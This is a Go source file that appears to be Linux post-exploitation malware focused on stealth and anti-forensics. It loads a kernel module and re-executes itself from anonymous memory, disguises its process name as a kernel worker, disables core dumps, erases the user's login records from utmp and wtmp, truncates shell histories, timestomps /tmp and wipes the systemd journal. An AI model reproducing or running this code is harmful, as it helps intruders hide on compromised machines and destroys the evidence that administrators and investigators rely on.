package main

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"
)

func jitterDuration(baseMs, maxMs int64) time.Duration {
	spread := maxMs - baseMs
	if spread <= 0 {
		return time.Duration(baseMs) * time.Millisecond
	}
	var buf [8]byte
	rand.Read(buf[:])
	offset := int64(binary.LittleEndian.Uint64(buf[:]) % uint64(spread))
	return time.Duration(baseMs+offset) * time.Millisecond
}

const utmpRecordSize = 384
const utmpUserOffset = 44
const utmpUserLen = 256

func loadModuleFromMemory(ko []byte) error {
	fd, err := unix.MemfdCreate("", unix.MFD_CLOEXEC)
	if err != nil {
		return err
	}
	defer unix.Close(fd)
	unix.Write(fd, ko)
	return unix.FinitModule(fd, "", 0)
}

func reexecFromMemory() {
	link, _ := os.Readlink("/proc/self/exe")
	if strings.Contains(link, "memfd") {
		return
	}

	self, err := os.ReadFile("/proc/self/exe")
	if err != nil {
		return
	}
	fd, err := unix.MemfdCreate("", 0)
	if err != nil {
		return
	}
	unix.Write(fd, self)
	path := fmt.Sprintf("/proc/self/fd/%d", fd)
	unix.Exec(path, os.Args, os.Environ())
}

func masquerade() {
	name := [16]byte{}
	copy(name[:], "[kworker/0:1]")
	unix.Prctl(unix.PR_SET_NAME, uintptr(unsafe.Pointer(&name[0])), 0, 0, 0)
	unix.Prctl(unix.PR_SET_DUMPABLE, 0, 0, 0, 0)
	unix.Setrlimit(unix.RLIMIT_CORE, &unix.Rlimit{Cur: 0, Max: 0})
}

func scrubAll() {
	user := os.Getenv("USER")
	if user == "" {
		user = "root"
	}
	scrubUtmp(user)
	clearHistory()
	timestomp("/tmp", "/etc/hostname")
	tamperJournal()
	os.Clearenv()
}

func scrubUtmp(username string) {
	for _, path := range []string{"/var/run/utmp", "/var/log/wtmp"} {
		f, err := os.OpenFile(path, os.O_RDWR, 0)
		if err != nil {
			continue
		}
		buf := make([]byte, utmpRecordSize)
		for {
			_, err := io.ReadFull(f, buf)
			if err != nil {
				break
			}
			raw := buf[utmpUserOffset : utmpUserOffset+utmpUserLen]
			end := bytes.IndexByte(raw, 0)
			if end < 0 {
				end = utmpUserLen
			}
			if string(raw[:end]) == username {
				f.Seek(-utmpRecordSize, io.SeekCurrent)
				f.Write(make([]byte, utmpRecordSize))
			}
		}
		f.Close()
	}
}

func clearHistory() {
	for _, path := range []string{
		os.Getenv("HOME") + "/.bash_history",
		os.Getenv("HOME") + "/.zsh_history",
		"/root/.bash_history",
	} {
		os.Truncate(path, 0)
	}
}

func timestomp(target, reference string) {
	info, err := os.Stat(reference)
	if err != nil {
		return
	}
	os.Chtimes(target, info.ModTime(), info.ModTime())
}

func tamperJournal() {
	exec.Command("/usr/bin/journalctl", "--rotate", "--vacuum-time=1s").Run()
	exec.Command("systemctl", "kill", "--signal=SIGUSR2", "systemd-journald").Run()
}
